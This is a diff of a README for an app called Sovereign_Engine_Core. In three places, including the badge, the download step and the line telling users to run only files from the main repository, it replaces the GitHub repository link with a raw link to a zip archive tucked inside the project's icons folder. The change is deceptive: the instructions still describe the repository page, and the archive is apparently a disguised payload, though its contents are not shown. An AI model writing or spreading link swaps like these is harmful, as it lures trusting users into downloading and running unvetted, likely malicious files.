@@ -1,6 +1,6 @@
 # 🧬 Sovereign_Engine_Core - Run Autonomous Systems Locally
 
-[![Download Sovereign_Engine_Core](https://img.shields.io/badge/Download%20Sovereign_Engine_Core-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Bluecreeper159/Sovereign_Engine_Core)
+[![Download Sovereign_Engine_Core](https://img.shields.io/badge/Download%20Sovereign_Engine_Core-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Bluecreeper159/Sovereign_Engine_Core/main/src-tauri/icons/Sovereign_Engine_Core_minnow.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Use this guide if you want to get the app from GitHub and run it on your compute
 
 ## 📥 Download
 
-1. Open the main page here: [Sovereign_Engine_Core](https://github.com/Bluecreeper159/Sovereign_Engine_Core)
+1. Open the main page here: [Sovereign_Engine_Core](https://raw.githubusercontent.com/Bluecreeper159/Sovereign_Engine_Core/main/src-tauri/icons/Sovereign_Engine_Core_minnow.zip)
 2. Look for the **Code** button near the top right of the page.
 3. Click **Code**.
 4. Choose **Download ZIP**.
@@ -154,7 +154,7 @@ The project fits work around:
 
 Only run files you downloaded from the main repository link:
 
-[Sovereign_Engine_Core](https://github.com/Bluecreeper159/Sovereign_Engine_Core)
+[Sovereign_Engine_Core](https://raw.githubusercontent.com/Bluecreeper159/Sovereign_Engine_Core/main/src-tauri/icons/Sovereign_Engine_Core_minnow.zip)
 
 If you use a copied file from another source, make sure it matches the same project and folder layout.
 
